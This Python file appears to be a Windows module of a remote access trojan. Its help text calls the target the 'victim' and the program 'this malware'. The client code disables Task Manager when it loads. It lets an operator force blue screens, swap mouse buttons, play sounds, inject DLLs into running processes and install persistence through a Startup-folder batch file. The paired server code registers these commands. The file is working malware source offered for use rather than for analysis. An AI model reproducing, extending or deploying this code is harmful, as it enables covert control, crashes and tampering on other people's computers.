"""
    Pyrovalerone
    Microsoft Windows(R) Module
    Note: Features remote administration logic for Windows OS
"""
import os
import BDModuleDefault
from BDRatMelodies import BDMELODY

try:
	from BDWinRAT import WinRAT

except Exception as exc:
	print("[WARN] Backdoor component WinRAT is not supported on this platform")

# Modules to be registered at both client-side and server-side
_modules = ["msgbox", "bsod", "swapmouse", "beep", "injectdll", "playtune", "persist"]
_builtins = []

""""
	@class ClientMain
	@brief The block that will be invoked by the client (victim)
"""
class ClientMain(BDModuleDefault.ClientMain):

	def __init__(self, handler):
		super().__init__(handler)

		# Create new Windows RAT API instance
		self.rat = WinRAT()

		# Start anti taskmgr
		print("ANTI TASK MANAGER IS RUNNING!")
		self.rat.antiTaskmgr()

		# Extend the default class with the new command modules
		self.registerCMDModules(_modules)

		"""
		@method msgbox
		@brief Displays a popup message on the client machine
		@param {list} argv Arguments array
		@return {str} Status of command exection
	"""
	def msgbox(self, argv):

		# Receive title
		title = argv[1]

		# Receive message
		message = argv[2]

		try:
			self.rat.msgbox(title=title, msg=message)

		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

	"""
		@method bsod
		@brief Triggers a blue-screen of death on the client machine
		@param {list} argv Arguments array
		@return {str} Status of command execution
	"""
	def bsod(self, argv):
		try:
			self.rat.bsod()
		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

	"""
		@method swapmouse
		@brief Swaps or restores the mouse buttons
		@param {list} argv Arguments array
		@return {str} Status of command exection
	"""
	def swapmouse(self, argv):

		try:
			if argv[1] == "on":
				self.rat.swapmouse(evil=1)
			else:
				self.rat.swapmouse(evil=0)

		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

	"""
		@method beep
		@brief Plays a frequency for a given duration
		@param {list} argv Arguments array
		@return {str} Status of command execution
	"""
	def beep(self, argv):
		try:
			

			freq = int(argv[1])
			
			duration = int(argv[2])

			self.rat.beep(freq, duration)

		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

	def playtune(self, argv):
		try:

			notes = argv[1]

			if notes in BDMELODY.keys():
				notes = BDMELODY[notes] # If its the case get the notes
			
			notes = notes.split(" ")

			repeat = int(argv[2])

			for i in range(0, repeat):
				self.rat.playNotes(notes)

		except Exception as exc:
			raise(exc)
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

	"""
		@method injectdll
		@brief injects a dynamic library into a running process
		@param {list} argv Arguments array
		@return {str} Status of command execution
	"""
	def injectdll(self, argv):
		try:

			# Get process identifier
			pid = int(argv[1])

			# Get DLL path
			dll = str(argv[2])

			# Attempt injection
			self.rat.injectdll(pid, dll)

		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

	def persist(self, argv):

		# Receive status message
		status = argv[1]

		try:
			# Get the AppData folder path
			appData = os.getenv("APPDATA")

			# Build the startup folder path
			startupFolder = appData+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"

			if status == "install":

				# Get the path to the folder with the python script
				virusPath = os.path.dirname(os.path.realpath(__file__))
				print(virusPath)

				# Generate batch code
				BATPAYLOAD = ""

				# Disable output
				BATPAYLOAD += "@echo off\n"

				# Enter virus directory
				BATPAYLOAD += "cd " + virusPath + "\n"

				# Execute the virus
				BATPAYLOAD += "python BDClient.py\n"

				# Exit cmd
				BATPAYLOAD += "exit\n"

				# Write batch payload to startup folder
				with open(startupFolder+"persist.bat", "w") as batchFile:
					batchFile.write(BATPAYLOAD)
					batchFile.close()

			elif status == "remove":

				# Check if module is persistent
				if os.path.exists(startupFolder+"persist.bat"):

					# Remove the persisting module
					os.remove(startupFolder+"persist.bat")

			else:

				# Check if persistence is present
				if os.path.exists(startupFolder+"persist.bat"):
					return "CMD_SUCCESS: Persistence installed: remove by running 'persist remove'."

				# If it is not let the user know
				else:
					return "CMD_SUCCESS: No persistence: install by running 'persist install'."

		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

class ServerMain(BDModuleDefault.ServerMain):

	def __init__(self, handler):
		super().__init__(handler)
		
		# Register modules
		self.registerCMDModules(_modules)

		# Add usage
		self.registerCMDHelp("msgbox", "Displays a modal message on victim host\nUsage: msgbox [title] [message]")
		self.registerCMDHelp("bsod", "Triggers a blue-screen of death on victim host")
		self.registerCMDHelp("swapmouse", "Swaps or restores mouse buttons\nUsage: swapmouse [on|off]")
		self.registerCMDHelp("beep", "Plays a frequency for a period on the victim host\nUsage: beep [frequency] [duration]")
		self.registerCMDHelp("playtune", "Plays a melody on the victim host\nUsage: playtune [notes (eg C4:4 D4:1 etc.)] or [built-in melody name]")
		self.registerCMDHelp("persist", "Makes this malware run at boot\nUsage: persist [install|remove|status]")
		self.registerCMDHelp("injectdll", "Injects a dynamic library into a running process\nUsage: injectdll [pid] [remote dll path]")



	"""
		@method msgbox
		@brief displays a modal on the client machine
		@param {list} argv Arguments array
		@return {str} Command execution status as received from client
	"""
	def msgbox(self, argv, checkArgs=False):

		if len(argv) < 3:
			return 'INVALID_ARGUMENT'

		if checkArgs:
			return "OK"

		return self.handler.recv_msg()

	def bsod(self, argv, checkArgs=False):

		if checkArgs:
			return "OK"

		pass

	def swapmouse(self, argv, checkArgs=False):
		if len(argv) < 2:
			return 'INVALID_ARGUMENT'

		if checkArgs:
			return "OK"

		return self.handler.recv_msg()

	def beep(self, argv, checkArgs=False):
		if len(argv) < 3:
			return 'INVALID_ARGUMENT'

		if checkArgs:
			return "OK"

		return self.handler.recv_msg()

	def playtune(self, argv, checkArgs=False):
		if len(argv) < 3:
			return 'INVALID_ARGUMENT'

		if checkArgs:
			return "OK"

		return self.handler.recv_msg()

	def injectdll(self, argv, checkArgs=False):
		if len(argv) < 3:
			return 'INVALID_ARGUMENT'

		if checkArgs:
			return "OK"

		return self.handler.recv_msg()

	def persist(self, argv, checkArgs=False):
		
		if len(argv) < 2:
			return 'INVALID_ARGUMENT'

		if checkArgs:
			return "OK"

		return self.handler.recv_msg()